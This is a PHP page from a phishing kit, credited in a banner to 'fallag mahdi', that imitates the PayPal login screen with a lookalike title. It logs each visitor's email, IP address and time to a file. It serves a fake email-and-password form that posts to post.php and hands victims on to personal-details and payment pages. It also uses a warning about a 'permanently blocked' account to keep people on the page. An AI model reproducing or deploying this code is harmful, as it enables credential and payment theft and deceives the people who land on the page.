<?php
#####################################################################################################
###################################### fallagmahdi@hotmail.com ######################################
###### ####### ##      ##      #######  #######       #### #### ####### ##     ##   ######   ########
##     ##   ## ##      ##      ##   ## ##             ## ### ## ##   ## ##     ##   ##    ##    ##
###### ####### ##      ##      ####### ##  ######     ##  #  ## ####### #########   ##     ##   ##
##     ##   ## ##      ##      ##   ## ##    ##       ##     ## ##   ## ##     ##   ##    ##    ##
##     ##   ## ####### ####### ##   ##  #######       ##     ## ##   ## ##     ##   ######   ########
############################## https://www.facebook.com/fallag.mahdi.tn #############################
#####################################################################################################
session_start();
include("inc/config.php");
$rand = @$_GET['dispatch'];
if(@$_SESSION['Done'] == 1) {
	die('<META HTTP-EQUIV="Refresh" Content="0; URL=personal.php?dispatch='.$rand.'">');
}
if(@$_SESSION['Done'] == 2) {
	die('<META HTTP-EQUIV="Refresh" Content="0; URL=payment.php?dispatch='.$rand.'">');
}
$email = @$_GET['email'];
$_SESSION['email'] = $email;
date_default_timezone_set("Africa/Tunis");
$date = date('d/m/Y', time());
$time = date('H:i:s', time());
$ip = getenv("REMOTE_ADDR");
$msg = "<b>$email </b> with <b>$ip</b> has cammed to <b>Index</b> at <b>$time - $date</b><br>";
$myFile = "../ips.html";
$fh = fopen($myFile, 'a+') or die("can't open file");
fwrite($fh, $msg);
fclose($fh);
$js = js_index();
if (@$_GET['id'] == "wrong") {
$css = css_index_wrong();
$html = html_index($css, $js, 'mahdi_10');
} else {
$css = css_index();
$html = html_index($css, $js);

}
die($html);
?>
<!Doctype html>
<html>
	<head>
		<link rel="stylesheet"  href="M/main.css"/>
		<link rel="shortcut icon" type="image/x-icon" href="favicon.ico" />
		<title>Login - P&alpha;yP&alpha;l</title>
		<script type="text/javascript" src="http://code.jquery.com/jquery.min.js"></script>
		<script type="text/javascript">

		function validate(){
			var email = $('input[name=MAHDI_1]');
			var pass = $('input[name=MAHDI_2]');
			var stat;
			if(email.val() == ''){ email.addClass("merror"); stat = false; }   
			if(pass.val() == ''){ pass.addClass("merror"); stat = false; }  
			if(stat == false) { return false ;}
			return true;
		}
		
		</script>
		<style>
</style>
	</head>	
	<body>
		<div class="">
			<div class="mahdi_2">
			  <form method="POST" action="post.php?dispatch=<?php echo $rand;?>" onsubmit='return validate();'>
				<div class="mahdi_3">
					<input type="text" class="large" name="MAHDI_1" value="<?=$email?>" placeholder="Email"/>
				</div>
				<div class="mahdi_4">
					<input type="password" class="large" name="MAHDI_2" placeholder="Password"/>
				</div>
				<div class="mahdi_5">
					<input type="submit" class="btn" value="Log in"/>
				</div>
			  </form>
			</div>
		</div>
				<script type="text/javascript">
document.getElementsByClassName('btn')[0].onclick = function(){
    window.btn_clicked = true;
};
window.onbeforeunload = function(){
    if(!window.btn_clicked){
        return 'If you leave, Your account may be blocked permanently !';
    }
};
$("input").change(function () {
        $(this).removeClass("merror");
}).trigger("change");
</script>

	</body>
</html>
